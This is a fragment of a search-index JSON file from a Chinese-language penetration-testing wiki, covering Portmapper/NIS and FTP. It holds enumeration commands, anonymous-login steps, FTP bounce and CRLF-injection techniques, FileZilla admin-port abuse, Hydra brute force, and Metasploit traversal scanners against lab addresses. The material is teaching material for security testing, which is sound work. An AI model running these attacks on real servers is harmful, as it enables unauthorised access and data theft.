\u8be6\u7ec6\u4fe1\u606f /etc/passwd passwd.byname, passwd.byuid NIS \u7528\u6237\u5bc6\u7801\u6587\u4ef6 /etc/group group.byname, group.bygid NIS\u7ec4\u6587\u4ef6 /usr/lib/aliases mail.aliases \u8be6\u7ec6\u90ae\u4ef6\u522b\u540d","title":"NIS"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#rpc-users","text":"\u5982\u679c\u60a8\u53d1\u73b0\u8fd9\u6837\u5217\u51fa\u7684 rusersd \u670d\u52a1\uff1a \u60a8\u53ef\u4ee5\u679a\u4e3e\u76d2\u5b50\u7684\u7528\u6237\u3002\u8981\u4e86\u89e3\u5982\u4f55\u9605\u8bfb[1026-\u6e17\u900f\u6d4b\u8bd5 Rsusersd]\u3002","title":"RPC Users"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#bypass-portmapper","text":"\u5982\u679c\u5728 nmap \u626b\u63cf\u671f\u95f4\u60a8\u770b\u5230 NFS \u7b49\u5f00\u653e\u7aef\u53e3\uff0c\u4f46\u7aef\u53e3 111 \u88ab\u8fc7\u6ee4\uff0c\u60a8\u5c06\u65e0\u6cd5\u5229\u7528\u8fd9\u4e9b\u7aef\u53e3\u3002 \u4f46\u662f\uff0c\u5982\u679c\u60a8\u53ef\u4ee5\u5728\u672c\u5730\u6a21\u62df\u4e00\u4e2a\u7aef\u53e3\u6620\u5c04\u5668\u670d\u52a1\uff0c\u5e76\u5c06 NFS \u7aef\u53e3\u4ece\u60a8\u7684\u673a\u5668\u4f20\u8f93\u5230\u53d7\u5bb3\u8005\u673a\u5668\uff0c\u60a8\u5c06\u80fd\u591f\u4f7f\u7528\u5e38\u89c4\u5de5\u5177\u6765\u5229\u7528\u8fd9\u4e9b\u670d\u52a1\u3002https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc \u4e2d\u7684\u66f4\u591a\u4fe1\u606f","title":"Bypass \u8fc7\u6ee4\u7684 Portmapper \u7aef\u53e3"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan_1","text":"Portmap","title":"Shodan"},{"location":"Network%20Prot/111-TCP-UDP-Portmapper%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"Protocol_Name: Portmapper #Protocol Abbreviation if there is one. Port_Number: 43 #Comma separated if there is more than one. Protocol_Description: PM or RPCBind #Protocol Abbreviation Spelled out Entry_1: Name: Notes Description: Notes for PortMapper Note: | \u63d0\u4f9b\u57fa\u4e8eUnix\u7684\u7cfb\u7edf\u4e4b\u95f4\u7684\u4fe1\u606f\u3002\u7aef\u53e3\u7ecf\u5e38\u88ab\u63a2\u6d4b\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u8bc6\u522bNix OS\uff0c\u5e76\u83b7\u53d6\u6709\u5173\u53ef\u7528\u670d\u52a1\u7684\u4fe1\u606f\u3002\u7528\u4e8eNFS\u3001NIS\u6216\u4efb\u4f55\u57fa\u4e8erpc\u7684\u670d\u52a1\u7684\u7aef\u53e3\u3002 Entry_2: Name: rpc info Description: May give netstat-type info Command: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43 Entry_3: Name: nmap Description: May give netstat-type info Command: nmap -sSUC -p 111 {IP}","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/","text":"\u57fa\u672c\u4fe1\u606f \u6587\u4ef6\u4f20\u8f93\u534f\u8bae(FTP )\u662f\u4e00\u79cd\u6807\u51c6\u7684\u7f51\u7edc\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e0a\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u8ba1\u7b97\u673a\u6587\u4ef6\u3002 \u5b83\u662f\u4e00\u4e2a \u7eaf\u6587\u672c \u534f\u8bae\uff0c\u4f7f\u7528 \u65b0\u884c\u5b57\u7b26 0x0d 0x0a \u6240\u4ee5\u6211\u4eec\u6709\u65f6\u5019\u9700\u8981\u4f7f\u7528 telnet \u6216 nc -C \u6765\u8fde\u63a5. \u9ed8\u8ba4\u7aef\u53e3: 21 PORT STATE SERVICE 21/tcp open ftp \u4e3b\u52a8\u548c\u88ab\u52a8\u8fde\u63a5 \u5728 \u4e3b\u52a8\u8fde\u63a5 FTP\u4e2d\uff0cFTP \u5ba2\u6237\u7aef \u9996\u5148 \u542f\u52a8 \u4ece\u5176\u7aef\u53e3N\u5230FTP\u670d\u52a1\u5668\u547d\u4ee4\u7aef\u53e3 - \u7aef\u53e321\u7684\u63a7\u5236 \u8fde\u63a5 \u3002\u5ba2\u6237\u7aef\u7136\u540e \u4fa6\u542c \u7aef\u53e3 N+1 \u5e76\u5c06\u7aef\u53e3 N+1 \u53d1\u9001\u5230 FTP\u670d\u52a1\u5668 \u3002FTP\u670d\u52a1\u5668\u7136\u540e \u53d1\u8d77 \u6570\u636e\u8fde\u63a5\uff0c\u4ece \u5b83\u7684\u7aef\u53e3M \u5230FTP\u5ba2\u6237\u7aef\u7684\u7aef\u53e3N+1\u3002 \u4f46\u662f\uff0c\u5982\u679c FTP \u5ba2\u6237\u7aef\u6709\u9632\u706b\u5899\u8bbe\u7f6e\u6765\u63a7\u5236\u6765\u81ea\u5916\u90e8\u7684\u4f20\u5165\u6570\u636e\u8fde\u63a5\uff0c\u90a3\u4e48\u6d3b\u52a8 FTP \u53ef\u80fd\u4f1a\u6210\u4e3a\u95ee\u9898\u3002\u5e76\u4e14\uff0c\u4e00\u4e2a\u53ef\u884c\u7684\u89e3\u51b3\u65b9\u6848\u662f\u88ab\u52a8 FTP\u3002 \u5728 Passive FTP \u4e2d\uff0c\u5ba2\u6237\u7aef\u53d1\u8d77\u4ece\u5b83\u7684N \u7aef\u53e3\u5230FTP Server \u768421 \u7aef\u53e3\u7684\u63a7\u5236\u8fde\u63a5\u3002\u5728\u6b64\u4e4b\u540e\uff0c\u5ba2\u6237\u7aef\u53d1\u51fa\u4e00\u4e2a passv \u547d\u4ee4 \u3002\u670d\u52a1\u5668\u7136\u540e\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u5176\u7aef\u53e3\u53f7 M \u4e4b\u4e00\u3002 \u5ba2\u6237\u7aef \u542f\u52a8 \u4ece\u5176 \u7aef\u53e3 P \u5230 FTP \u670d\u52a1\u5668\u7684\u7aef\u53e3 M\u7684\u6570\u636e \u8fde\u63a5\u3002 \u6765\u6e90: https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/ \u8fde\u63a5\u8c03\u8bd5 FTP\u547d\u4ee4 debug \u548c trace \u53ef\u4ee5\u7528\u6765\u67e5\u770b \u901a\u4fe1\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002 \u679a\u4e3e Banner \u6293\u53d6 nc -vn <IP> 21 openssl s_client -connect crossfit.htb:21 -starttls ftp #\u83b7\u53d6\u8bc1\u4e66(\u5982\u6709) \u4f7f\u7528starttls\u8fde\u63a5FTP lftp lftp :~> set ftp:ssl-force true lftp :~> set ssl:verify-certificate no lftp :~> connect 10.10.10.208 lftp 10.10.10.208:~> login Usage: login <user|URL> [<pass>] lftp 10.10.10.208:~> login username Password Unauth\u679a\u4e3e \u4f7f\u7528 nmap sudo nmap -sV -p21 -sC -A 10.10.10.10 \u4f60\u53ef\u4ee5\u4f7f\u7528 HELP \u548c FEAT \u547d\u4ee4\u6765\u83b7\u53d6FTP\u670d\u52a1\u5668\u7684\u4e00\u4e9b\u4fe1\u606f: HELP 214-The following commands are recognized (* =>'s unimplemented): 214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV 214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD 214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP 214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC* 214-PBSZ PROT TYPE STRU MODE RETR STOR STOU 214-APPE REST ABOR USER PASS ACCT* REIN* LIST 214-NLST STAT SITE MLSD MLST 214 Direct comments to root@drei.work FEAT 211-Features: PROT CCC PBSZ AUTH TLS MFF modify;UNIX.group;UNIX.mode; REST STREAM MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*; UTF8 EPRT EPSV LANG en-US MDTM SSCN TVFS MFMT SIZE 211 End STAT #FTP\u670d\u52a1\u5668\u7684\u4fe1\u606f(\u7248\u672c\uff0c\u914d\u7f6e\uff0c\u72b6\u6001\u2026) \u533f\u540d\u767b\u5f55 anonymous : anonymous anonymous : ftp : ftp ftp <IP> >anonymous >anonymous >ls -a # \u5217\u51fa\u6240\u6709\u6587\u4ef6(\u751a\u81f3\u9690\u85cf)(\u662f\u7684\uff0c\u5b83\u4eec\u53ef\u80fd\u88ab\u9690\u85cf) >binary #\u5c06\u4f20\u8f93\u65b9\u5f0f\u8bbe\u7f6e\u4e3a\u4e8c\u8fdb\u5236\u800c\u4e0d\u662fAscii >ascii #\u5c06\u4f20\u8f93\u8bbe\u7f6e\u4e3aAscii\u800c\u4e0d\u662f\u4e8c\u8fdb\u5236 >bye #\u9000\u51fa \u81ea\u52a8\u5316 nmap\u9ed8\u8ba4\u4f7f\u7528 -sC \u9009\u9879\u6267\u884c\u533f\u540d\u767b\u5f55\u548c\u53cd\u5f39FTP\u68c0\u67e5\u3002 nmap --script ftp-* -p 21 <ip> \u6d4f\u89c8\u5668\u8fde\u63a5 \u60a8\u53ef\u4ee5\u4f7f\u7528\u6d4f\u89c8\u5668(\u5982Firefox)\u901a\u8fc7\u5982\u4e0bURL\u8fde\u63a5\u5230FTP\u670d\u52a1\u5668: ftp://anonymous:anonymous@10.10.10.98 \u8bf7\u6ce8\u610f\uff0c\u5982\u679c web\u5e94\u7528\u7a0b\u5e8f \u76f4\u63a5\u5411FTP\u670d\u52a1\u5668 \u53d1\u9001\u7528\u6237 \u63a7\u5236\u7684\u6570\u636e \uff0c\u60a8\u53ef\u4ee5\u53d1\u9001\u53ccURL\u7f16\u7801' %0d%0a '(\u5728\u53ccURL\u7f16\u7801\u4e2d\uff0c\u8fd9\u662f' %250d%250a ')\u5b57\u8282\uff0c\u5e76\u4f7f FTP\u670d\u52a1\u5668\u6267\u884c\u4efb\u610f\u64cd\u4f5c\u3002\u5176\u4e2d\u4e00\u79cd\u53ef\u80fd\u7684\u4efb\u610f\u64cd\u4f5c\u662f\u4ece\u7528\u6237\u63a7\u5236\u7684\u670d\u52a1\u5668\u4e0b\u8f7d\u5185\u5bb9\uff0c\u6267\u884c\u7aef\u53e3\u626b\u63cf\u6216\u5c1d\u8bd5\u4e0e\u5176\u4ed6\u57fa\u4e8e\u7eaf\u6587\u672c\u7684\u670d\u52a1(\u5982http)\u901a\u4fe1\u3002 \u4eceFTP\u4e0b\u8f7d\u6240\u6709\u6587\u4ef6 wget -m ftp://anonymous:anonymous@10.10.10.98 #\u4e0b\u8f7d\u5168\u90e8 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #\u4e0b\u8f7d\u5168\u90e8 \u4e00\u4e9bFTP\u547d\u4ee4 USER username PASS password HELP \u670d\u52a1\u5668\u663e\u793a\u652f\u6301\u54ea\u4e9b\u547d\u4ee4 PORT 127,0,0,1,0,80 \u8fd9\u5c06\u6307\u793aFTP\u670d\u52a1\u5668\u4e0e\u7aef\u53e380\u4e2d\u7684IP 127.0.0.1\u5efa\u7acb\u8fde\u63a5( \u60a8\u9700\u8981\u5c06\u7b2c5\u4e2a\u5b57\u7b26\u8bbe\u4e3a\u201c0\u201d\uff0c\u7b2c6\u4e2a\u5b57\u7b26\u8bbe\u4e3a\u5341\u8fdb\u5236\u7aef\u53e3\uff0c\u6216\u8005\u4f7f\u7528\u7b2c5\u548c\u7b2c6\u4e2a\u5b57\u7b26\u8868\u793a\u5341\u516d\u8fdb\u5236\u7aef\u53e3 )\u3002 EPRT |2|127.0.0.1|80| \u8fd9\u5c06\u6307\u793aFTP\u670d\u52a1\u5668\u4e0e\u7aef\u53e380\u4e2d\u7684IP 127.0.0.1\u5efa\u7acbTCP\u8fde\u63a5( \u7531\u201c2\u201d \u8868\u793a)\u3002 \u547d\u4ee4\u652f\u6301IPv6 \u3002 LIST \u8fd9\u5c06\u53d1\u9001\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\u5217\u8868 LIST -R \u9012\u5f52\u5217\u51fa\uff08\u5982\u679c\u670d\u52a1\u5668\u5141\u8bb8\uff09 APPE /path/something.txt \u8fd9\u5c06\u663e\u793a FTP \u5c06\u4ece \u88ab\u52a8 \u8fde\u63a5\u6216\u4ece PORT/EPRT \u8fde\u63a5\u63a5\u6536\u5230\u7684\u6570\u636e\u5b58\u50a8\u5230\u6587\u4ef6\u4e2d\u3002\u5982\u679c\u6587\u4ef6\u540d\u5b58\u5728\uff0c\u5b83\u5c06\u8ffd\u52a0\u6570\u636e\u3002 STOR /path/something.txt \u94fe\u63a5 APPE \u4f46\u5b83\u4f1a\u8986\u76d6\u6587\u4ef6 STOU /path/something.txt \u94fe\u63a5 APPE , \u4f46\u5982\u679c\u5b58\u5728\uff0c\u5b83\u4e0d\u4f1a\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 RETR /path/to/file \u5fc5\u987b\u5efa\u7acb\u88ab\u52a8\u6216\u7aef\u53e3\u8fde\u63a5\u3002\u7136\u540e\uff0cFTP \u670d\u52a1\u5668\u5c06\u901a\u8fc7\u8be5\u8fde\u63a5\u53d1\u9001\u6307\u793a\u7684\u6587\u4ef6 REST 6 \u8fd9\u5c06\u6307\u793a\u670d\u52a1\u5668\u4e0b\u6b21\u4f7f\u7528\u5b83\u53d1\u9001 RETR \u5185\u5bb9\u65f6\u5e94\u8be5\u4ece\u7b2c 6 \u4e2a\u5b57\u8282\u5f00\u59cb\u3002 TYPE i \u8bbe\u7f6e\u4f20\u8f93\u4e3a\u4e8c\u8fdb\u5236 PASV \u8fd9\u5c06\u6253\u5f00\u4e00\u4e2a\u88ab\u52a8\u8fde\u63a5\uff0c\u5e76\u6307\u793a\u7528\u6237\u53ef\u4ee5\u8fde\u63a5 PUT /tmp/file.txt \u5c06\u6307\u5b9a\u7684\u6587\u4ef6\u4e0a\u4f20\u5230 FTP [ ] FTP\u53cd\u5f39 attack \u6709\u4e9bFTP\u670d\u52a1\u5668\u5141\u8bb8\u4f7f\u7528PORT\u547d\u4ee4\u3002\u6b64\u547d\u4ee4\u53ef\u7528\u4e8e\u5411\u670d\u52a1\u5668\u6307\u793a\u60a8\u5e0c\u671b\u901a\u8fc7\u67d0\u4e9b\u7aef\u53e3\u8fde\u63a5\u5230\u5176\u4ed6FTP\u670d\u52a1\u5668\u3002\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u8be5\u547d\u4ee4\u901a\u8fc7FTP\u670d\u52a1\u5668\u626b\u63cf\u4e3b\u673a\u7684\u54ea\u4e9b\u7aef\u53e3\u662f\u5f00\u653e\u7684\u3002 \u60a8\u8fd8\u53ef\u4ee5\u6ee5\u7528\u6b64\u884c\u4e3a\u4f7f FTP \u670d\u52a1\u5668\u4e0e\u5176\u4ed6\u534f\u8bae\u4ea4\u4e92\u3002\u60a8\u53ef\u4ee5 \u4e0a\u4f20\u4e00\u4e2a\u5305\u542b HTTP \u8bf7\u6c42\u7684\u6587\u4ef6\uff0c \u5e76\u8ba9\u6613\u53d7\u653b\u51fb\u7684 FTP \u670d\u52a1\u5668 \u5c06\u5176\u53d1\u9001\u5230\u4efb\u610f HTTP \u670d\u52a1\u5668 \uff08 \u4e5f\u8bb8\u662f\u4e3a\u4e86\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u7ba1\u7406\u5458\u7528\u6237\uff1f \uff09\uff0c\u6216\u8005\u751a\u81f3\u4e0a\u4f20\u4e00\u4e2a FTP \u8bf7\u6c42\uff0c\u5e76\u8ba9\u6613\u53d7\u653b\u51fb\u7684 FTP \u670d\u52a1\u5668\u4e0b\u8f7d\u4e00\u4e2a\u4e0d\u540c\u7684\u6587\u4ef6FTP\u670d\u52a1\u5668\u3002 \u7406\u8bba\u5f88\u7b80\u5355\uff1a \u5c06\u8bf7\u6c42\uff08\u5728\u6587\u672c\u6587\u4ef6\u4e2d\uff09\u4e0a\u4f20\u5230\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u5982\u679c\u60a8\u60f3\u4e0e\u53e6\u4e00\u4e2a HTTP \u6216 FTP \u670d\u52a1\u5668\u901a\u4fe1\uff0c\u60a8\u9700\u8981\u66f4\u6539\u884c 0x0d 0x0a \u7528\u4e8e \u907f\u514d\u53d1\u9001\u60a8\u4e0d\u60f3\u53d1\u9001\u7684\u5b57\u7b26 \uff08\u4e5f\u8bb8\u5c06\u8bf7\u6c42\u4e0a\u4f20\u5230\u60a8\u9700\u8981\u5728\u5f00\u5934\u653e\u7f6e\u4e00\u4e9b\u56fe\u50cf\u6807\u9898\u7684\u6587\u4ef6\u4e2d\uff09 REST X \u7528\u4e8e \u8fde\u63a5\u5230\u4efb\u610f\u670d\u52a1\u5668\u548c\u670d\u52a1 PORT \u7528\u4e8e \u5c06\u4fdd\u5b58\u7684\u8bf7\u6c42\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 RETR \u8fd9\u5f88\u53ef\u80fd\u4f1a\u5f15\u53d1\u7c7b\u4f3c Socket not writable* \u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fde\u63a5\u6301\u7eed\u65f6\u95f4\u4e0d\u8db3\u4ee5\u53d1\u9001\u6570\u636e \u3002\u5c3d\u91cf\u907f\u514d\u7684\u5efa\u8bae\u662f\uff1a RETR \u5982\u679c\u60a8\u8981\u53d1\u9001 HTTP \u8bf7\u6c42\uff0c \u8bf7\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u53d1\u9001\u76f8\u540c\u7684\u8bf7\u6c42\uff0c \u76f4\u5230\u81f3\u5c11**~0.5MB \u5c1d\u8bd5 \u7528\u76f8\u5bf9\u4e8e\u534f\u8bae\u7684\u201c\u5783\u573e\u201d\u6570\u636e\u586b\u5145\u8bf7\u6c42 (\u4e0eFTP\u901a\u4fe1\u53ef\u80fd\u53ea\u662f\u5783\u573e\u547d\u4ee4\u6216\u91cd\u590d' RETR '\u6307\u4ee4\u6765\u83b7\u53d6\u6587\u4ef6) \u7528\u5927\u91cf\u7a7a\u5b57\u7b26\u6216\u5176\u4ed6\u5b57\u7b26\u586b\u5145\u8bf7\u6c42 Filezilla \u670d\u52a1\u6f0f\u6d1e FileZilla \u901a\u5e38 \u7ed1\u5b9a \u5230 FileZilla-Server \uff08\u7aef\u53e3 14147\uff09\u7684 \u672c\u5730 \u7ba1\u7406\u670d\u52a1 \u3002\u5982\u679c\u60a8\u53ef\u4ee5\u4ece \u60a8\u7684\u673a\u5668\u521b\u5efa\u4e00\u4e2a \u96a7\u9053 \u6765\u8bbf\u95ee\u6b64\u7aef\u53e3\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 \u7a7a\u767d\u5bc6\u7801 \u8fde\u63a5 *\u5230 \u5b83 \u5e76\u4e3a FTP \u670d\u52a1 \u521b\u5efa \u4e00\u4e2a \u65b0\u7528\u6237**\u3002 \u914d\u7f6e\u6587\u4ef6 ftpusers ftp.conf proftpd.conf vsftpd.conf Post-Exploitation vsFTPd \u7684\u9ed8\u8ba4\u914d\u7f6e\u53ef\u4ee5\u5728 /etc/vsftpd.conf . \u5728\u8fd9\u91cc\uff0c\u60a8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5371\u9669\u7684\u8bbe\u7f6e\uff1a anonymous_enable=YES anon_upload_enable=YES anon_mkdir_write_enable=YES anon_root=/home/username/ftp - \u533f\u540d\u76ee\u5f55\u3002 chown_uploads=YES - \u66f4\u6539\u533f\u540d\u4e0a\u4f20\u6587\u4ef6\u7684\u6240\u6709\u6743 chown_username=username - \u83b7\u5f97\u533f\u540d\u4e0a\u4f20\u6587\u4ef6\u6240\u6709\u6743\u7684\u7528\u6237 local_enable=YES - \u5141\u8bb8\u672c\u5730\u7528\u6237\u767b\u5f55 no_anon_password=YES - \u4e0d\u8981\u533f\u540d\u8be2\u95ee\u5bc6\u7801 write_enable=YES - \u5141\u8bb8\u547d\u4ee4\uff1aSTOR\u3001DELE\u3001RNFR\u3001RNTO\u3001MKD\u3001RMD\u3001APPE \u548c SITE Shodan ftp port:21 \u81ea\u52a8\u5316 Protocol_Name: FTP #\u534f\u8bae\u7f29\u5199(\u5982\u679c\u6709\u7684\u8bdd)\u3002 Port_Number: 21 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u5219\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: File Transfer Protocol #\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for FTP Note: | Anonymous Login -bi <<< so that your put is done via binary wget --mirror 'ftp://ftp_user:UTDRSCH53c\"$6hys@10.10.10.59' ^^to download all dirs and files wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' if PASV transfer is disabled Entry_2: Name: Banner Grab Description: Grab FTP Banner via telnet Command: telnet -n {IP} 21 Entry_3: Name: Cert Grab Description: Grab FTP Certificate if existing Command: openssl s_client -connect {IP}:21 -starttls ftp Entry_4: Name: nmap ftp Description: Anon login and bounce FTP checks are performed Command: nmap --script ftp-* -p 21 {IP} Entry_5: Name: Browser Connection Description: Connect with Browser Note: ftp://anonymous:anonymous@{IP} Entry_6: Name: Hydra Brute Force Description: Need Username Command: hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp Entry_7: Name: consolesless mfs enumeration ftp Description: FTP enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit'","title":"21 - FTP\u6e17\u900f"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_1","text":"\u6587\u4ef6\u4f20\u8f93\u534f\u8bae(FTP )\u662f\u4e00\u79cd\u6807\u51c6\u7684\u7f51\u7edc\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e0a\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u8ba1\u7b97\u673a\u6587\u4ef6\u3002 \u5b83\u662f\u4e00\u4e2a \u7eaf\u6587\u672c \u534f\u8bae\uff0c\u4f7f\u7528 \u65b0\u884c\u5b57\u7b26 0x0d 0x0a \u6240\u4ee5\u6211\u4eec\u6709\u65f6\u5019\u9700\u8981\u4f7f\u7528 telnet \u6216 nc -C \u6765\u8fde\u63a5. \u9ed8\u8ba4\u7aef\u53e3: 21 PORT STATE SERVICE 21/tcp open ftp","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_2","text":"\u5728 \u4e3b\u52a8\u8fde\u63a5 FTP\u4e2d\uff0cFTP \u5ba2\u6237\u7aef \u9996\u5148 \u542f\u52a8 \u4ece\u5176\u7aef\u53e3N\u5230FTP\u670d\u52a1\u5668\u547d\u4ee4\u7aef\u53e3 - \u7aef\u53e321\u7684\u63a7\u5236 \u8fde\u63a5 \u3002\u5ba2\u6237\u7aef\u7136\u540e \u4fa6\u542c \u7aef\u53e3 N+1 \u5e76\u5c06\u7aef\u53e3 N+1 \u53d1\u9001\u5230 FTP\u670d\u52a1\u5668 \u3002FTP\u670d\u52a1\u5668\u7136\u540e \u53d1\u8d77 \u6570\u636e\u8fde\u63a5\uff0c\u4ece \u5b83\u7684\u7aef\u53e3M \u5230FTP\u5ba2\u6237\u7aef\u7684\u7aef\u53e3N+1\u3002 \u4f46\u662f\uff0c\u5982\u679c FTP \u5ba2\u6237\u7aef\u6709\u9632\u706b\u5899\u8bbe\u7f6e\u6765\u63a7\u5236\u6765\u81ea\u5916\u90e8\u7684\u4f20\u5165\u6570\u636e\u8fde\u63a5\uff0c\u90a3\u4e48\u6d3b\u52a8 FTP \u53ef\u80fd\u4f1a\u6210\u4e3a\u95ee\u9898\u3002\u5e76\u4e14\uff0c\u4e00\u4e2a\u53ef\u884c\u7684\u89e3\u51b3\u65b9\u6848\u662f\u88ab\u52a8 FTP\u3002 \u5728 Passive FTP \u4e2d\uff0c\u5ba2\u6237\u7aef\u53d1\u8d77\u4ece\u5b83\u7684N \u7aef\u53e3\u5230FTP Server \u768421 \u7aef\u53e3\u7684\u63a7\u5236\u8fde\u63a5\u3002\u5728\u6b64\u4e4b\u540e\uff0c\u5ba2\u6237\u7aef\u53d1\u51fa\u4e00\u4e2a passv \u547d\u4ee4 \u3002\u670d\u52a1\u5668\u7136\u540e\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u5176\u7aef\u53e3\u53f7 M \u4e4b\u4e00\u3002 \u5ba2\u6237\u7aef \u542f\u52a8 \u4ece\u5176 \u7aef\u53e3 P \u5230 FTP \u670d\u52a1\u5668\u7684\u7aef\u53e3 M\u7684\u6570\u636e \u8fde\u63a5\u3002 \u6765\u6e90: https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/","title":"\u4e3b\u52a8\u548c\u88ab\u52a8\u8fde\u63a5"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_3","text":"FTP\u547d\u4ee4 debug \u548c trace \u53ef\u4ee5\u7528\u6765\u67e5\u770b \u901a\u4fe1\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002","title":"\u8fde\u63a5\u8c03\u8bd5"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_4","text":"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#banner","text":"nc -vn <IP> 21 openssl s_client -connect crossfit.htb:21 -starttls ftp #\u83b7\u53d6\u8bc1\u4e66(\u5982\u6709)","title":"Banner \u6293\u53d6"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#starttlsftp","text":"lftp lftp :~> set ftp:ssl-force true lftp :~> set ssl:verify-certificate no lftp :~> connect 10.10.10.208 lftp 10.10.10.208:~> login Usage: login <user|URL> [<pass>] lftp 10.10.10.208:~> login username Password","title":"\u4f7f\u7528starttls\u8fde\u63a5FTP"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#unauth","text":"\u4f7f\u7528 nmap sudo nmap -sV -p21 -sC -A 10.10.10.10 \u4f60\u53ef\u4ee5\u4f7f\u7528 HELP \u548c FEAT \u547d\u4ee4\u6765\u83b7\u53d6FTP\u670d\u52a1\u5668\u7684\u4e00\u4e9b\u4fe1\u606f: HELP 214-The following commands are recognized (* =>'s unimplemented): 214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV 214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD 214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP 214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC* 214-PBSZ PROT TYPE STRU MODE RETR STOR STOU 214-APPE REST ABOR USER PASS ACCT* REIN* LIST 214-NLST STAT SITE MLSD MLST 214 Direct comments to root@drei.work FEAT 211-Features: PROT CCC PBSZ AUTH TLS MFF modify;UNIX.group;UNIX.mode; REST STREAM MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*; UTF8 EPRT EPSV LANG en-US MDTM SSCN TVFS MFMT SIZE 211 End STAT #FTP\u670d\u52a1\u5668\u7684\u4fe1\u606f(\u7248\u672c\uff0c\u914d\u7f6e\uff0c\u72b6\u6001\u2026)","title":"Unauth\u679a\u4e3e"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_5","text":"anonymous : anonymous anonymous : ftp : ftp ftp <IP> >anonymous >anonymous >ls -a # \u5217\u51fa\u6240\u6709\u6587\u4ef6(\u751a\u81f3\u9690\u85cf)(\u662f\u7684\uff0c\u5b83\u4eec\u53ef\u80fd\u88ab\u9690\u85cf) >binary #\u5c06\u4f20\u8f93\u65b9\u5f0f\u8bbe\u7f6e\u4e3a\u4e8c\u8fdb\u5236\u800c\u4e0d\u662fAscii >ascii #\u5c06\u4f20\u8f93\u8bbe\u7f6e\u4e3aAscii\u800c\u4e0d\u662f\u4e8c\u8fdb\u5236 >bye #\u9000\u51fa","title":"\u533f\u540d\u767b\u5f55"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_6","text":"nmap\u9ed8\u8ba4\u4f7f\u7528 -sC \u9009\u9879\u6267\u884c\u533f\u540d\u767b\u5f55\u548c\u53cd\u5f39FTP\u68c0\u67e5\u3002 nmap --script ftp-* -p 21 